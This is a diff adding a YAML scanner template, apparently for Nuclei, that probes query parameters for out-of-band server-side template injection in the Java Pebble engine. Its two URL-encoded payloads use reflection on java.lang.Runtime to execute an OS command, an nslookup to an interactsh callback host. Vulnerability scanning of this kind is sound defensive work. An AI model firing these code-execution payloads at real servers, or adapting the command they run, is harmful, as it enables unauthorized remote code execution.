@@ -1,0 +1,41 @@
+id: pebble-oob
+
+info:
+  name: Pebble - Out of Band Template Injection
+  author: ritikchaddha
+  severity: high
+  description: |
+    Pebble is a Java templating engine inspired by Twig and similar to the Python Jinja Template Engine syntax. It features templates inheritance and easy-to-read syntax, ships with built-in autoescaping for security, and includes integrated support for internationalization.
+  reference:
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Java.md#pebble---code-execution
+  metadata:
+    max-request: 1
+  tags: ssti,dast,pebble
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        - "{%25%20set%20cmd%20=%20%27nslookup%20-type=SRV%20{{interactsh-url}}%27%20%25}{%25%20set%20bytes%20%3D%20(1).TYPE.forName(%27java.lang.Runtime%27).methods%5B6%5D.invoke(null,null).exec(cmd).inputStream.readAllBytes()%20%25}{{%20(1).TYPE.forName(%27java.lang.String%27).constructors%5B0%5D.newInstance((%5Bbytes%5D).toArray())%20}}"
+        - "{{%20variable.getClass().forName(%27java.lang.Runtime%27).getRuntime().exec(%27nslookup%20-type=SRV%20{{interactsh-url}}%27)%20}}"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    skip-variables-check: true
+    matchers:
+      - type: dsl
+        name: request-matcher
+        dsl:
+          - "contains(interactsh_protocol,'dns')"
+          - "contains(interactsh_request,'srv')"
+        condition: and
+# digest: 4a0a0047304502205cc8f8b50a2b4d6dda2c97de2cff17e6ccbd9f35e9598db37a79e0bf1fe77868022100b551d62b5181343729b88b6ceef1226d54d9037924eb1ce0b95a34f014fb18d0:922c64590222798bb761d5b6d8e72950
